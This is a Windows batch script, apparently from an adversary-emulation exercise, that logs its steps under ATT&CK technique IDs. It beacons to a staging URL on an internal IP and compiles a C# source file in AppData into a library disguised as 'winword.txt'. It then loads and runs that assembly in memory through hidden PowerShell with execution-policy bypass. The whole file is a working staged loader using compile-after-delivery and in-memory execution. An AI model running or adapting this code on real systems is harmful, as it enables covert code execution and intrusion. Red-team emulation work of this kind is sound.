@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\8681\980ea451
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8681-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=winword.txt
SET njozco=file.txt
SET kkjwr=8681
SET zxddff=%APPDATA%\!ufeybybm!\macula-simulations.log

echo [%DATE% %TIME%][DEBUG][!lqyereup!]: heartbeat_start>> "!zxddff!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: heartbeat_done>> "!zxddff!" 2>nul

echo [%DATE% %TIME%][DEBUG][!lqyereup!]: chdir_start=!recnn!>> "!zxddff!" 2>nul
cd /d "!recnn!" >nul 2>&1
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: chdir_done=!cd!>> "!zxddff!" 2>nul

echo [%DATE% %TIME%][DEBUG][!lqyereup!]: compile_start=!njozco!>> "!zxddff!" 2>nul
SET qwmnb=1
SET detcf=
csc.exe /target:library /out:"!hpnjatpj!" "!njozco!" >nul 2>&1
IF NOT EXIST "!hpnjatpj!" (SET qwmnb=0&SET detcf=compile_failed)
echo [%DATE% %TIME%][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!qwmnb!:!detcf!>> "!zxddff!" 2>nul
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: compile_done=!qwmnb!>> "!zxddff!" 2>nul

echo [%DATE% %TIME%][DEBUG][!lqyereup!]: execute_start=!hpnjatpj!>> "!zxddff!" 2>nul
SET kkjfrm=1
SET detcf=
powershell.exe -nop -w hidden -ep bypass -Command "& { [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('!hpnjatpj!')).EntryPoint.Invoke($null, @(,[string[]]@())) }" >nul 2>&1
IF !ERRORLEVEL! NEQ 0 (SET kkjfrm=0&SET detcf=exec_failed_!ERRORLEVEL!)
echo [%DATE% %TIME%][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!kkjfrm!:!detcf!>> "!zxddff!" 2>nul
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: execute_done=!kkjfrm!>> "!zxddff!" 2>nul